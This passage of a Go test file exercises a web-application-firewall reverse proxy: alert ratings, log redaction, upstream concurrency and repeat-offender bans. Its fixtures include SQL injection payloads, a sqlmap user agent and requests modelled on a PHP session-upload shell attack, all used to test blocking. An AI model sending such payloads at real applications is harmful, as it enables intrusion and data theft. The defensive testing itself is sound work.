	// A rule the catalog does not know, such as one written into Before or After, is rated as a rule set rule that scores,
	// or as medium when it refuses or would have.
	for _, m := range slices.Concat(capped, cappedDetect) {
		if want := map[bool]string{true: "medium", false: "info"}[m.RuleID == 10100]; m.RuleID >= 10001 && m.RuleID <= 10100 && m.Risk != want {
			t.Errorf("rule %d is rated %q, want %q", m.RuleID, m.Risk, want)
			break
		}
	}
	for id, want := range map[int]string{942100: "sqli/low", 920350: "protocol/info", 949110: "/high", 5001002: "/low", idUpstreamFailed: "/info"} {
		if kinds[id] != want {
			t.Errorf("rule %d is %q, want %q", id, kinds[id], want)
		}
	}
	// In detection mode the verdict is rated as the verdict, not as a rule that scores.
	for _, m := range cappedDetect {
		if m.RuleID == 949110 && m.Category+"/"+m.Risk != "/high" {
			t.Errorf("in detection mode 949110 is %q, want \"/high\"", m.Category+"/"+m.Risk)
		}
	}
	ownKinds := map[int]string{}
	for _, m := range own {
		ownKinds[m.RuleID] = m.Category + "/" + m.Risk
	}
	for id, want := range map[int]string{idEvalBusy: "inspection/medium", idEvalBudget: "inspection/medium", idTooManyConns: "flood/low", idRateStateFull: "rate/info"} {
		if ownKinds[id] != want {
			t.Errorf("the edge's line %d is %q, want %q", id, ownKinds[id], want)
		}
	}
	localLabel, upstreamLabel := false, false
	// Every line is about one request and names it, and an inspector's line names it as the rule set's lines do.
	inspected, hexID := map[string]bool{}, regexp.MustCompile(`^[0-9a-f]{16}$`)
	for _, m := range plain {
		if !hexID.MatchString(m.TransactionID) {
			t.Errorf("a match without the request's id: %+v", m)
		}
		if m.RuleID == 5001002 {
			inspected[m.TransactionID] = true
		}
	}
	joined := map[string]bool{}
	for _, m := range plain {
		if m.RuleID != 5001002 && inspected[m.TransactionID] {
			joined[m.TransactionID] = true
		}
	}
	if len(inspected) != 2 || len(joined) != 2 {
		t.Errorf("the inspector's lines name %d requests, %d of them also named by the rule set's lines; want 2 and 2", len(inspected), len(joined))
	}
	for _, m := range plain {
		localLabel = localLabel || m.RuleID == 5006001 && m.Message == "XPath predicate injection syntax"
		upstreamLabel = upstreamLabel || m.RuleID == idUpstreamFailed && strings.HasPrefix(m.Message, "upstream ")
		text := fmt.Sprintf("%+v", m)
		if strings.Contains(text, secret) || strings.Contains(text, "127.0.0.1") || m.ClientIP != "" || m.URI != "" || m.Data != "" || m.ExpandedMessage != "" {
			t.Errorf("a default match carries request data: %+v", m)
		}
		if m.RuleID == 0 || m.Message == "" {
			t.Errorf("a match without a rule: %+v", m)
		}
	}
	if !localLabel {
		t.Error("local rule has no safe family label")
	}
	if !upstreamLabel {
		t.Error("upstream failure has no safe operational label")
	}
	found, expandedFound, upstreamDetails := false, false, false
	cut := false
	for _, m := range detailed {
		if m.ClientIP != "127.0.0.1" {
			t.Errorf("the client is not the visitor's address alone: %+v", m)
		}
		if len(m.Data) > maxDetail || len(m.ExpandedMessage) > maxDetail {
			t.Errorf("a detail over %d bytes: %d and %d", maxDetail, len(m.Data), len(m.ExpandedMessage))
		}
		cut = cut || m.RuleID == 5000099 && strings.HasSuffix(m.Data, "…") && strings.HasSuffix(m.ExpandedMessage, "…")
		found = found || strings.Contains(m.URI, secret) || strings.Contains(m.Data, secret)
		expandedFound = expandedFound || m.RuleID == 5000099 && strings.Contains(m.ExpandedMessage, secret)
		upstreamDetails = upstreamDetails || m.RuleID == idUpstreamFailed && strings.Contains(m.URI, secret) && m.ExpandedMessage != ""
	}
	if !found || !expandedFound || !upstreamDetails {
		t.Error("LogDetails did not add the request details")
	}
	if !cut {
		t.Error("a long matched value was not cut with a marker")
	}

	// Every request in which something was found has one alert per signature, with the request's final verdict for it
	// (ADR-0084), whatever NoRuleMatches leaves out of the lines; a clean request has none.
	inspector := func(id, status int) inspect.Inspector {
		return fakeInspector{"formats", func(r *inspect.Request) inspect.Result {
			return inspect.Result{Verdicts: []inspect.Verdict{{ID: id, Message: "a finding", Severity: "medium", Block: status != 0, Status: status}}}
		}}
	}
	sqli := get("/search?q=" + url.QueryEscape("1' OR '"+secret+"'='"+secret+"' --"))
	numericHost := strings.Replace(get("/page"), "Host: shop.example.test", "Host: 127.0.0.1", 1)
	firefox10 := strings.Replace(strings.Replace(get("/page", "Accept-Language: en\r\n"), "HTTP/1.1", "HTTP/1.0", 1),
		"Mozilla/5.0 Chrome/120", "Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0", 1)
	gptbot := strings.Replace(get("/page"), "Mozilla/5.0 Chrome/120", "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.3; +https://openai.com/gptbot)", 1)
	for _, tt := range []struct {
		name    string
		change  func(*Config)
		request string
		status  int
		want    []string // signature, action and status of each alert
		check   func(t *testing.T, a alert.Alert)
	}{
		{"block: the anomaly verdict blocks an attack", nil, sqli, 403, []string{"crs-949110 blocked 403"}, func(t *testing.T, a alert.Alert) {
			if a.Score < 5 || a.Threshold != 5 || !a.Categories.Has(alert.CatSQLi) || !slices.Contains(a.Rules, 942100) || len(a.Rules) > alert.MaxRules ||
				a.Risk != alert.RiskHigh || a.Mode != alert.ModeBlock || a.Layer != alert.LayerCRS {
				t.Errorf("verdict %+v", a)
			}
			if a.Src != netip.MustParseAddr("127.0.0.1") || a.ViaProxy || a.Method != "GET" || a.Host != "shop.example.test" || a.Path != "/search?" {
				t.Errorf("request %+v", a)
			}
		}},
		{"detect: the same attack would have been blocked", func(c *Config) { c.CRS.Mode = crs.ModeDetect }, sqli, 200,
			[]string{"crs-949110 would_block 0"}, func(t *testing.T, a alert.Alert) {
				if a.Score < 5 || a.Mode != alert.ModeDetect || !a.Categories.Has(alert.CatSQLi) {
					t.Errorf("verdict %+v", a)
				}
			}},
		{"below the threshold a finding is detected", nil, numericHost, 200, []string{"crs-920350 detected 0"}, func(t *testing.T, a alert.Alert) {
			if a.Risk != alert.RiskInfo || !a.Categories.Has(alert.CatProtocol) || a.Score != 0 {
				t.Errorf("finding %+v", a)
			}
		}},
		{"a stricter local rule not switched on is detected", nil, get("/console"), 200, []string{"crs-5006101 detected 0"},
			func(t *testing.T, a alert.Alert) {
				if a.Layer != alert.LayerCRS || a.Mode != alert.ModeDetect || a.Risk != alert.RiskLow || !a.Categories.Has(alert.CatScanner) {
					t.Errorf("finding %+v", a)
				}
			}},
		{"switched on, it blocks", func(c *Config) { c.CRS.LocalRulesOn = []int{5006101} }, get("/console"), 403, []string{"crs-949110 blocked 403"},
			func(t *testing.T, a alert.Alert) {
				if !slices.Contains(a.Rules, 5006101) {
					t.Errorf("verdict %+v", a)
				}
			}},
		{"not switched on, it is no part of another attack's verdict", nil, strings.Replace(sqli, "/search?", "/console?", 1), 403,
			[]string{"crs-5006101 detected 0", "crs-949110 blocked 403"}, func(t *testing.T, a alert.Alert) {
				if a.RuleID == 949110 && slices.Contains(a.Rules, 5006101) {
					t.Errorf("verdict %+v", a)
				}
			}},
		{"a monitor finding of an inspector is detected", func(c *Config) { c.Inspectors = []inspect.Inspector{inspector(5002103, 0)} },
			get("/page"), 200, []string{"formats-5002103 detected 0"}, func(t *testing.T, a alert.Alert) {
				if a.Layer != alert.LayerFormats || a.Mode != alert.ModeMonitor || a.Risk != alert.RiskMedium {
					t.Errorf("finding %+v", a)
				}
			}},
		{"an inspector's refusal is blocked with its status", func(c *Config) { c.Inspectors = []inspect.Inspector{inspector(5002103, 400)} },
			get("/page"), 400, []string{"formats-5002103 blocked 400"}, nil},
		{"two refusals of one request are one refused request", func(c *Config) {
			c.Inspectors = []inspect.Inspector{fakeInspector{"formats", func(r *inspect.Request) inspect.Result {
				return inspect.Result{Verdicts: []inspect.Verdict{{ID: 5002103, Severity: "medium", Block: true, Status: 400},
					{ID: 5002104, Severity: "medium", Block: true, Status: 400}}}
			}}}
		}, get("/page"), 400, []string{"formats-5002103 blocked 400", "formats-5002104 blocked 400"}, nil},
		{"the proxy's own refusal is blocked", nil, get("/a/./b"), 400, []string{"carnical-5000002 blocked 400"}, nil},
		{"with no rule matches in the log the alert is still given", func(c *Config) { c.NoRuleMatches = true }, sqli, 403,
			[]string{"crs-949110 blocked 403"}, nil},
		{"with the source and the path off", func(c *Config) { c.Alerts = AlertOptions{Source: alert.SourceOff, Path: alert.PathOff} }, sqli, 403,
			[]string{"crs-949110 blocked 403"}, func(t *testing.T, a alert.Alert) {
				if a.Src.IsValid() || a.Path != "" {
					t.Errorf("source %v and path %q", a.Src, a.Path)
				}
			}},
		{"the full path has no query", func(c *Config) { c.Alerts.Path = alert.PathFull }, sqli, 403, []string{"crs-949110 blocked 403"},
			func(t *testing.T, a alert.Alert) {
				if a.Path != "/search" {
					t.Errorf("path %q", a.Path)
				}
			}},
		{"an attack names the kind of client that sent it", nil, strings.Replace(sqli, "User-Agent: Mozilla/5.0 Chrome/120\r\n",
			"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0\r\nAccept-Language: en\r\n", 1), 403,
			[]string{"crs-949110 blocked 403"}, func(t *testing.T, a alert.Alert) {
				if a.Client != alert.ClientPerson {
					t.Errorf("client %v, want person", a.Client)
				}
			}},
		{"a kind of bot the policy lists is refused", func(c *Config) { c.Bots = &bots.Policy{Refuse: 1 << alert.ClientAI} }, gptbot, 403,
			[]string{"bots-5005003 blocked 403"}, func(t *testing.T, a alert.Alert) {
				if a.Layer != alert.LayerBots || a.Client != alert.ClientAI || !a.Categories.Has(alert.CatBot) || a.Risk != alert.RiskLow {
					t.Errorf("refusal %+v", a)
				}
			}},
		{"in monitor mode it would have been", func(c *Config) { c.Bots = &bots.Policy{Watch: 1 << alert.ClientAI} }, gptbot, 200,
			[]string{"bots-5005003 would_block 0"}, nil},
		{"a kind it does not list passes", func(c *Config) { c.Bots = &bots.Policy{Refuse: 1 << alert.ClientTool} }, gptbot, 200, nil, nil},
		{"a browser's request over HTTP/1.0 is disguised", func(c *Config) { c.Bots = &bots.Policy{Refuse: 1 << alert.ClientDisguised} },
			firefox10, 403, []string{"bots-5005012 blocked 403"}, nil},
		{"unless a trusted proxy chose HTTP/1.0, as nginx does", func(c *Config) {
			c.Bots = &bots.Policy{Refuse: 1 << alert.ClientDisguised}
			c.TrustedProxies = []netip.Prefix{netip.MustParsePrefix("127.0.0.0/8")}
		}, strings.Replace(firefox10, "Connection: close", "X-Forwarded-For: 203.0.113.9\r\nConnection: close", 1), 200, nil, nil},
		{"a clean request has none", nil, get("/page"), 200, nil, nil},
	} {
		t.Run(tt.name, func(t *testing.T) {
			var amu sync.Mutex
			var got []alert.Alert
			var lines []Match
			s := start(t, func(c *Config) {
				c.OnAlert = func(a alert.Alert) { amu.Lock(); got = append(got, a); amu.Unlock() }
				c.OnMatch = func(m Match) { amu.Lock(); lines = append(lines, m); amu.Unlock() }
				if tt.change != nil {
					tt.change(c)
				}
			})
			if status, _ := s.raw(t, tt.request); status != tt.status {
				t.Fatalf("status %d, want %d", status, tt.status)
			}
			amu.Lock()
			defer amu.Unlock()
			var verdicts []string
			for _, a := range got {
				verdicts = append(verdicts, fmt.Sprintf("%s %s %d", a.Sig, a.Action, a.Status))
				if !hexID.MatchString(a.ID) || a.Count != 1 || strings.Contains(fmt.Sprintf("%+v", a), secret) {
					t.Errorf("alert %+v", a)
				}
				for _, m := range lines {
					if m.TransactionID != "" && m.TransactionID != a.ID {
						t.Errorf("a line names request %s, the alert %s", m.TransactionID, a.ID)
					}
				}
			}
			slices.Sort(verdicts)
			if !slices.Equal(verdicts, tt.want) {
				t.Fatalf("alerts %q, want %q", verdicts, tt.want)
			}
			// The totals count requests: a refused one once, however many of its alerts say so.
			agg, err := alert.NewAggregator(alert.Config{Sink: alert.SinkFunc(func(alert.Record) {})})
			if err != nil {
				t.Fatal(err)
			}
			for _, a := range got {
				agg.Observe(a)
			}
			refused := 0
			if tt.status >= 400 {
				refused = 1
			}
			if tot := agg.Totals(); tot.RefusedBots()+tot.RefusedPeople() != uint64(refused) {
				t.Errorf("refused requests counted %d bots and %d people, want %d in all", tot.RefusedBots(), tot.RefusedPeople(), refused)
			}
			if tt.check != nil {
				tt.check(t, got[0])
			}
		})
	}
}

func TestAStalledUploadDoesNotUseUpAnUpstreamPlace(t *testing.T) {
	s := start(t, func(c *Config) { c.MaxUpstreamInFlight = 1 })
	// A client announces a body and never sends it.
	stalled, err := net.Dial("tcp", s.addr)
	if err != nil {
		t.Fatal(err)
	}
	defer stalled.Close()
	fmt.Fprintf(stalled, "POST /upload HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: text/html\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100000\r\n\r\na=")
	time.Sleep(300 * time.Millisecond)
	if status, _ := s.raw(t, get("/page")); status != 200 {
		t.Fatalf("an ordinary request while an upload stalled: %d", status)
	}
}

func TestOnlyTheConfiguredNumberOfRequestsReachTheUpstreamAtOnce(t *testing.T) {
	s := start(t, func(c *Config) { c.MaxUpstreamInFlight = 1 })
	hold := make(chan struct{})
	s.up.mu.Lock()
	s.up.hold = hold
	s.up.mu.Unlock()
	first := make(chan int, 1)
	go func() { status, _ := s.raw(t, get("/slow")); first <- status }()
	deadline := time.Now().Add(3 * time.Second)
	for len(s.up.requests()) == 0 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	status, reply := s.raw(t, get("/second"))
	if status != http.StatusServiceUnavailable || !strings.Contains(reply, "Retry-After: 1") {
		t.Errorf("second request while the place was taken: %d\n%.200s", status, reply)
	}
	close(hold)
	if got := <-first; got != 200 {
		t.Errorf("the first request: %d", got)
	}
	if status, _ := s.raw(t, get("/third")); status != 200 {
		t.Errorf("after the place was freed: %d", status)
	}
}

func TestTheReverseProxysOwnLinesGoToItsErrorLog(t *testing.T) {
	var mu sync.Mutex
	var lines strings.Builder
	s := start(t, func(c *Config) {
		c.ErrorLog = log.New(writerFunc(func(p []byte) (int, error) {
			mu.Lock()
			defer mu.Unlock()
			return lines.Write(p)
		}), "", 0)
	})
	s.raw(t, get("/cut"))
	mu.Lock()
	defer mu.Unlock()
	if !strings.Contains(lines.String(), "ReverseProxy read error during body copy") {
		t.Fatalf("a body cut short by the application was not reported to ErrorLog: %q", lines.String())
	}
}

type writerFunc func([]byte) (int, error)

func (f writerFunc) Write(p []byte) (int, error) { return f(p) }

func TestTheUpstreamHostCanBePinned(t *testing.T) {
	plain := start(t, nil)
	pinned := start(t, func(c *Config) { c.UpstreamHost = "origin.internal" })
	plain.raw(t, get("/page"))
	pinned.raw(t, get("/page"))
	if got := plain.up.requests(); len(got) != 1 || got[0].Host != "shop.example.test" {
		t.Errorf("by default the visitor's Host is kept: %+v", got)
	}
	if got := pinned.up.requests(); len(got) != 1 || got[0].Host != "origin.internal" {
		t.Errorf("a pinned Host is used whatever the visitor sent: %+v", got)
	}
}

// A sequence of requests against one shield, which the single-request alert table above cannot express: the offences a
// request's verdict counts reach the shield's repeat-offender bans (ADR-0085), keyed on the verified visitor only.
func TestBlockedAttacksBanTheirSourceThroughTheShield(t *testing.T) {
	sqli := "/search?q=" + url.QueryEscape("1' UNION SELECT password FROM users --")
	from := func(addr string) string { return "X-Forwarded-For: " + addr + "\r\n" }
	for _, tt := range []struct {
		name       string
		mode       shield.AutoBlockMode
		crs        crs.Mode
		exempt     []netip.Prefix
		after      int    // the status of a clean request from the attacker after four attacks
		bannedSays string // the alert of that request, if it is refused
		ua         string // the attacks' user agent, when it is what they are refused for
		bots       *bots.Policy
		request    string // the attack, when it is neither the SQL injection nor its user agent
	}{
		{"four blocked attacks ban the source", shield.AutoBlockOn, crs.ModeBlock, nil, 403, "shield-5004008 source_blocked 403", "", nil, ""},
		{"monitor only reports the source", shield.AutoBlockMonitor, crs.ModeBlock, nil, 200, "", "", nil, ""},
		{"attacks only detected never ban", shield.AutoBlockOn, crs.ModeDetect, nil, 200, "", "", nil, ""},
		{"an exempt source is never banned", shield.AutoBlockOn, crs.ModeBlock, []netip.Prefix{netip.MustParsePrefix("203.0.113.0/24")}, 200, "", "", nil, ""},
		{"a scanner refused by name is banned, whatever the rule set's mode", shield.AutoBlockOn, crs.ModeDetect, nil, 403,
			"shield-5004008 source_blocked 403", "sqlmap/1.8.11#stable (https://sqlmap.org)", &bots.Policy{Refuse: 1 << alert.ClientScanner}, ""},
		{"a declared crawler refused by name is not", shield.AutoBlockOn, crs.ModeBlock, nil, 200, "", "GPTBot/1.3",
			&bots.Policy{Refuse: 1 << alert.ClientAI}, ""},
		{"PHP2Shell's upload progress field is banned, whatever the rule set's mode", shield.AutoBlockOn, crs.ModeDetect, nil, 403,
			"shield-5004008 source_blocked 403", "", nil, uploadRequest(multipartBody("Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nup1"))},
		{"PHP2Shell's leak is banned, whatever the rule set's mode", shield.AutoBlockOn, crs.ModeDetect, nil, 403,
			"shield-5004008 source_blocked 403", "", nil, get("/php-session", "X-Set-Cookie: PHPSESSID=%00%01\r\n")},
	} {
		t.Run(tt.name, func(t *testing.T) {
			var emu sync.Mutex
			var events []shield.Event
			sh, err := shield.New(shield.Config{Trusted: loopback.Allow, AutoBlock: shield.AutoBlock{Mode: tt.mode, Exempt: tt.exempt},
				OnEvent: func(ev shield.Event) { emu.Lock(); events = append(events, ev); emu.Unlock() }})
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(sh.Close)
			var amu sync.Mutex
			var got []alert.Alert
			s := start(t, func(c *Config) {
				c.CRS.Mode, c.Shield, c.TrustedProxies, c.Bots = tt.crs, sh, loopback.Allow, tt.bots
				c.OnAlert = func(a alert.Alert) { amu.Lock(); got = append(got, a); amu.Unlock() }
			})
			attack := get(sqli, from("203.0.113.7"))
			if tt.ua != "" {
				attack = strings.Replace(get("/", from("203.0.113.7")), "Mozilla/5.0 Chrome/120", tt.ua, 1)
			}
			if tt.request != "" {
				method, rest, _ := strings.Cut(tt.request, "\r\n")
				attack = method + "\r\n" + from("203.0.113.7") + rest
			}
			for range 4 {
				s.raw(t, attack)
			}
			amu.Lock()
			got = got[:0]
			amu.Unlock()
			if status, _ := s.raw(t, get("/page", from("203.0.113.7"))); status != tt.after {
				t.Fatalf("a clean request from the attacker: %d, want %d", status, tt.after)
			}
			if status, _ := s.raw(t, get("/page", from("203.0.113.9"))); status != 200 {
				t.Fatalf("another visitor behind the same proxy: %d", status)
			}
			amu.Lock()
			var says []string
			for _, a := range got {
				says = append(says, fmt.Sprintf("%s %s %d", a.Sig, a.Action, a.Status))
			}
			amu.Unlock()
			if tt.bannedSays != "" && !slices.Contains(says, tt.bannedSays) {
				t.Errorf("alerts %q, want %q", says, tt.bannedSays)
			}
			sh.Tick() // the shield's events are delivered on its tick
			emu.Lock()
			defer emu.Unlock()
			var kinds []string
			for _, ev := range events {
				if strings.HasPrefix(ev.Kind, "source_") {
					kinds = append(kinds, ev.Kind+" "+ev.Client.String())
				}
			}
			want := map[shield.AutoBlockMode]string{shield.AutoBlockOn: "source_blocked 203.0.113.7", shield.AutoBlockMonitor: "source_would_block 203.0.113.7"}[tt.mode]
			if tt.crs == crs.ModeDetect && tt.bots == nil && tt.request == "" || tt.exempt != nil || tt.bots != nil && tt.after == 200 {
				want = ""
			}
			if (want == "") != (len(kinds) == 0) || want != "" && kinds[0] != want {
				t.Errorf("shield events %q, want %q", kinds, want)
			}
		})
	}
}

// The shield's own counters, which no alert shows: a refusal before admission counts as a rejection of its visitor, and a
// request a check in detection mode would have refused counts as a would-be rejection.
func TestRefusalsAndWouldBeRefusalsReachTheShield(t *testing.T) {
	sqli := "/search?q=" + url.QueryEscape("1' UNION SELECT password FROM users --")
	from := "X-Forwarded-For: 203.0.113.7\r\n"
	for _, tt := range []struct {
		name                string
		request             string
		rejected, wouldBeen uint64
	}{
		{"a CONNECT is a rejection", "CONNECT shop.example.test:443 HTTP/1.1\r\nHost: shop.example.test:443\r\n" + from + "Connection: close\r\n\r\n", 1, 0},
		{"an attack only detected would have been refused", get(sqli, from), 0, 1},
		{"a clean request is neither", get("/page", from), 0, 0},
	} {
		t.Run(tt.name, func(t *testing.T) {
			sh, err := shield.New(shield.Config{Trusted: loopback.Allow})
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(sh.Close)
			s := start(t, func(c *Config) { c.CRS.Mode, c.Shield, c.TrustedProxies = crs.ModeDetect, sh, loopback.Allow })
			s.raw(t, tt.request)
			var snap shield.Snapshot
			for deadline := time.Now().Add(2 * time.Second); ; time.Sleep(10 * time.Millisecond) { // counted once the request is done
				snap = sh.Snapshot()
				if snap.SecurityRejections == tt.rejected && snap.WouldRejections == tt.wouldBeen || time.Now().After(deadline) {
					break
				}
			}
			if snap.SecurityRejections != tt.rejected || snap.WouldRejections != tt.wouldBeen {
				t.Errorf("rejections %d, would-be rejections %d; want %d and %d", snap.SecurityRejections, snap.WouldRejections, tt.rejected, tt.wouldBeen)
			}
		})
	}
}

// noDNS is a resolver that answers nothing.
type noDNS struct{}

func (noDNS) LookupAddr(context.Context, string) ([]string, error) { return nil, errors.New("no DNS") }
func (noDNS) LookupNetIP(context.Context, string, string) ([]netip.Addr, error) {
	return nil, errors.New("no DNS")
}

// gate is a person check for the tests: what it does is chosen by path, and it keeps what it was told.
type gate struct {
	mu     sync.Mutex
	seen   []challenge.Signals
	late   func(challenge.Outcome)
	inside chan struct{} // for /gate/racing: closed once its report is under way
	hijack chan error    // for /gate/hijack: the connection handoff and response result
}

func (g *gate) Serve(w http.ResponseWriter, r *http.Request, s challenge.Signals, report func(challenge.Outcome)) bool {
	g.mu.Lock()
	g.seen = append(g.seen, s)
	g.mu.Unlock()
	status := http.StatusOK
	switch r.URL.Path {
	case "/gate/pass":
		report(challenge.Outcome{Verdict: challenge.Passed, Score: 5})
	case "/gate/refuse":
		report(challenge.Outcome{Verdict: challenge.Refused, Score: 140, Reason: "straight-line+20, <script>\n" + strings.Repeat("x", 100)})
		report(challenge.Outcome{Verdict: challenge.Refused, Score: 1, Reason: "a second report"}) // ignored
		status = http.StatusForbidden
	case "/gate/show", "/page":
		if s.Point == challenge.Request && r.URL.Path == "/page" {
			return false // the check is only for some pages
		}
		report(challenge.Outcome{Verdict: challenge.Shown})
	case "/gate/sloppy": // writes an answer and says it did not: it answered all the same
		_, _ = io.WriteString(w, "from the gate")
		return false
	case "/gate/flush", "/gate/flush-handled":
		if err := http.NewResponseController(w).Flush(); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return true
		}
		return r.URL.Path == "/gate/flush-handled"
	case "/gate/hijack", "/gate/hijack-handled":
		report(challenge.Outcome{Verdict: challenge.Refused})
		conn, rw, err := http.NewResponseController(w).Hijack()
		if err == nil {
			_, err = rw.WriteString("HTTP/1.1 403 Forbidden\r\nContent-Length: 13\r\nConnection: close\r\n\r\nfrom the gate")
			if err == nil {
				err = rw.Flush()
			}
			conn.Close()
		}
		g.hijack <- err
		return r.URL.Path == "/gate/hijack-handled"
	case "/gate/read": // reads the whole body, as a check reading its answer might
		n, err := io.Copy(io.Discard, r.Body)
		w.Header().Set("X-Read", strconv.FormatInt(n, 10)+" "+strconv.FormatBool(err != nil))
	case "/gate/late": // keeps report to call it after Serve has returned
		g.mu.Lock()
		g.late = report
		g.mu.Unlock()
	case "/gate/racing": // reports on a goroutine of its own, and lets the request go on while the report is under way
		go report(challenge.Outcome{Verdict: challenge.Refused})
		<-g.inside
		return false
	default:
		return false
	}
	w.WriteHeader(status)
	_, _ = io.WriteString(w, "from the gate")
	return true
}

// Respond marks each response it is shown, so that a test can tell it saw it and that what it changed was forwarded.
func (g *gate) Respond(r *http.Request, status int, h http.Header) {
	h.Set("X-Gate-Saw", strconv.Itoa(status)+" "+r.Host+r.URL.Path+" "+r.Header.Get("User-Agent"))
	if r.URL.Path == "/learned" {
		h.Add("Set-Cookie", "learned=1") // a cookie for one visitor: the response must not be cached
	}
}

// RespondTrailer takes the trailers meant for the check off each response, and marks the others it saw.
func (g *gate) RespondTrailer(_ *http.Request, t http.Header) {
	for k := range t {
		if strings.HasPrefix(strings.ToLower(k), "x-gate-only") {
			delete(t, k)
		}
	}
	if t.Get("Grpc-Status") != "" {
		t.Set("Grpc-Status", t.Get("Grpc-Status")+" seen")
	}
}

func (g *gate) signals() []challenge.Signals {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]challenge.Signals(nil), g.seen...)
}

type gatePlainWriter struct{ http.ResponseWriter }
type gateUnwrapWriter struct{ http.ResponseWriter }

func (w gateUnwrapWriter) Unwrap() http.ResponseWriter { return w.ResponseWriter }

type gateUnsupportedFlusher struct{ http.ResponseWriter }

func (w gateUnsupportedFlusher) FlushError() error { return http.ErrNotSupported }

type gateFailedHijacker struct {
	http.ResponseWriter
	err error
}

func (w gateFailedHijacker) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return nil, nil, w.err
}

// The person check is offered every request that passed the shield, the bot policy and the request policy, and is told
// what they found; what it answers goes no further, and what it decides is alerted on and admits a person past the
// shield.
func TestThePersonCheckIsOfferedEachRequest(t *testing.T) {
	var mu sync.Mutex
	var matches []Match
	g := &gate{}
	sh, err := shield.New(shield.Config{})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(sh.Close)
	s := start(t, func(c *Config) {
		c.Challenge, c.Shield = g, sh
		c.UpstreamHost = "origin.example.internal" // the check still sees the host the visitor asked for
		c.Bots = &bots.Policy{Refuse: 1 << alert.ClientScanner, Watch: 1 << alert.ClientTool}
		c.OnMatch = func(m Match) { mu.Lock(); matches = append(matches, m); mu.Unlock() }
	})
	matched := func(id int) (out []Match) {
		mu.Lock()
		defer mu.Unlock()
		for _, m := range matches {
			if m.RuleID == id {
				out = append(out, m)
			}
		}
		return out
	}

	t.Run("a request it lets go on reaches the application, with what was found", func(t *testing.T) {
		status, reply := s.raw(t, "GET /page HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: curl/8.5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n")
		sig := g.signals()
		if status != 200 || strings.Contains(reply, "from the gate") || len(sig) != 1 || !strings.Contains(reply, "X-Gate-Saw: 200 shop.example.test/page curl/8.5.0\r\n") {
			t.Fatalf("%d %q, %d offers", status, reply, len(sig))
		}
		if got := sig[0]; got.Point != challenge.Request || got.Kind != alert.ClientTool || !got.Watched || got.Client != netip.MustParseAddr("127.0.0.1") || got.Attack {
			t.Fatalf("signals %+v", got)
		}
	})
	t.Run("a request it answers goes no further", func(t *testing.T) {
		before := len(s.up.requests())
		status, reply := s.raw(t, get("/gate/show"))
		if status != 200 || !strings.Contains(reply, "from the gate") || len(s.up.requests()) != before || strings.Contains(reply, "X-Gate-Saw") ||
			!strings.Contains(reply, "Cache-Control: no-store\r\n") || !strings.Contains(reply, "X-Content-Type-Options: nosniff\r\n") {
			t.Fatalf("%d %q; the application saw %d more", status, reply, len(s.up.requests())-before)
		}
		if g.signals()[1].Kind == alert.ClientTool || g.signals()[1].Watched {
			t.Fatalf("signals %+v", g.signals()[1])
		}
		// Nor does one it wrote an answer to and then let go on.
		if status, reply := s.raw(t, get("/gate/sloppy")); status != 200 || !strings.Contains(reply, "from the gate") || len(s.up.requests()) != before {
			t.Fatalf("written and let go on: %d %q; the application saw %d more", status, reply, len(s.up.requests())-before)
		}
		for _, path := range []string{"/gate/flush", "/gate/flush-handled"} {
			status, reply := s.raw(t, get(path))
			if status != 200 || len(s.up.requests()) != before || strings.Contains(reply, "reached the application") ||
				!strings.Contains(reply, "Cache-Control: no-store\r\n") || !strings.Contains(reply, "X-Content-Type-Options: nosniff\r\n") {
				t.Errorf("flushed %s: %d %q; the application saw %d more", path, status, reply, len(s.up.requests())-before)
			}
		}
	})
	t.Run("an unsupported flush leaves the response untouched", func(t *testing.T) {
		for _, kind := range []string{"plain", "unwrapped", "explicit-error"} {
			t.Run(kind, func(t *testing.T) {
				raw := httptest.NewRecorder()
				raw.Header().Set("Cache-Control", "public, max-age=60")
				raw.Header().Set("X-Content-Type-Options", "original")
				raw.Header().Set("Connection", "keep-alive")
				var w http.ResponseWriter = gatePlainWriter{raw}
				switch kind {
				case "unwrapped":
					w = gateUnwrapWriter{w}
				case "explicit-error":
					w = gateUnsupportedFlusher{raw}
				}
				gw := &gateWriter{ResponseWriter: w, closeConn: true}
				if err := http.NewResponseController(gw).Flush(); !errors.Is(err, http.ErrNotSupported) {
					t.Fatalf("flush: %v", err)
				}
				if gw.wrote || raw.Flushed || raw.Header().Get("Cache-Control") != "public, max-age=60" ||
					raw.Header().Get("X-Content-Type-Options") != "original" || raw.Header().Get("Connection") != "keep-alive" {
					t.Fatalf("unsupported flush changed response: wrote=%v flushed=%v headers=%v", gw.wrote, raw.Flushed, raw.Header())
				}
			})
		}
	})
	t.Run("taking over the connection answers the request", func(t *testing.T) {
		failed := errors.New("controlled hijack failure")
		for _, tc := range []struct {
			name, method                  string
			handled, wrapped, unsupported bool
			failure                       error
		}{
			{name: "false return", method: "GET"},
			{name: "false return for DELETE", method: "DELETE"},
			{name: "true return", method: "GET", handled: true},
			{name: "wrapped writer", method: "GET", wrapped: true},
			{name: "failed handoff", method: "GET", failure: failed},
			{name: "unsupported handoff", method: "GET", unsupported: true},
		} {
			t.Run(tc.name, func(t *testing.T) {
				g := &gate{hijack: make(chan error, 1)}
				up := newUpstream(t)
				target, _ := url.Parse(up.URL)
				cfg := Config{Upstream: target, CRS: crs.DefaultSettings(), Origin: loopback, Challenge: g,
					ErrorLog: log.New(io.Discard, "", 0)}
				ruleSetOff(&cfg)
				edge, err := New(cfg)
				if err != nil {
					t.Fatal(err)
				}
				t.Cleanup(func() { edge.Close() })
				done := make(chan struct{})
				srv := httptest.NewUnstartedServer(nil)
